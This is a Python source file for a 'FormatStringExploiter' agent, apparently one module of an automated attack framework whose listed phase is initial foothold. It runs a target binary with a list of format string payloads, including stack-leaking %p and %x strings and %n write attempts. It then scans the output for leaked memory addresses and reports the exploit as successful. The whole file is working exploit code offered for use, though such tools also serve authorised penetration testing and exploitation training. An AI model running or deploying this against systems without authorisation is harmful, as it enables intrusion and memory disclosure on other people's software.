from core.base_agent import BaseAgent
import asyncio
import logging
import re
from typing import Dict, Any
from core.data_models import AgentData, AttackPhase, Strategy, ErrorType # Added ErrorType

logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


class FormatStringExploiter(BaseAgent):
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD]
    required_tools = []
    """
    An agent that specializes in detecting and exploiting format string vulnerabilities.
    It aims to leak memory from the stack.
    """

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.report_class = AgentData # Default report class
        # A simple payload designed to leak the first few values from the stack.
        self.payloads = [
            "%p" * 8,          # Leak pointers
            "%x" * 8,          # Leak hex values from stack
            "%s%s%s%s",        # Attempt to read strings from stack pointers
            "AAAA%7$p",        # Direct parameter access to leak 7th arg
            "AAAA%8$p",        # Direct parameter access to leak 8th arg
            "%n",              # Simple write attempt (can cause crash)
            "AAAA%7$n",        # Write attempt at a specific location
        ]
        # More specific regex for memory addresses (e.g., 0x7ff..., 0x55..., etc.)
        self.leak_pattern = re.compile(rb"(0x[0-9a-fA-F]{6,})")

    async def run(self, strategy: Strategy, **kwargs) -> AgentData:
        binary_path = strategy.context.get("binary_path")
        if not binary_path:
            return self.create_report(
                errors=["Missing binary_path in strategy context."],
                summary="Format string exploitation failed: Binary path not provided.",
                error_type=ErrorType.CONFIGURATION
            )

        self.logger.info(
            f"Starting format string exploit attempt on {binary_path}")

        for payload in self.payloads:
            try:
                command = [binary_path, payload]
                self.logger.debug(f"Executing command: {' '.join(command)}")

                process = await asyncio.create_subprocess_exec(
                    *command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=10)

                output = stdout + stderr

                self.logger.debug(f"Payload: {payload}\nOUTPUT: {output}")

                leaks = self.leak_pattern.findall(output)

                if len(leaks) > 2:
                    self.logger.info(
                        f"SUCCESS! Potential format string vulnerability exploited in {binary_path}")
                    return self.create_report(
                        summary=f"Potential format string vulnerability exploited in {binary_path}.",
                        binary_path=binary_path,
                        payload=payload,
                        leaked_data=[leak.decode('latin-1') for leak in leaks],
                    )

            except FileNotFoundError:
                self.logger.error(f"Binary not found at {binary_path}")
                return self.create_report(
                    errors=[f"Binary not found at {binary_path}"],
                    summary=f"Format string exploitation failed: Binary not found at {binary_path}.",
                    error_type=ErrorType.CONFIGURATION
                )
            except asyncio.TimeoutError:
                self.logger.warning(
                    f"Command timed out with payload: {payload}")
                continue  # Try the next payload
            except Exception as e:
                self.logger.error(
                    f"An unexpected error occurred with payload '{payload}': {e}")
                continue  # Try the next payload

        self.logger.info(
            f"Exploit attempt finished. No memory leak detected for {binary_path}.")
        return self.create_report(
            errors=[f"No memory leak detected for {binary_path}."],
            summary=f"Format string exploitation completed: No memory leak detected for {binary_path}.",
            error_type=ErrorType.LOGIC
        )
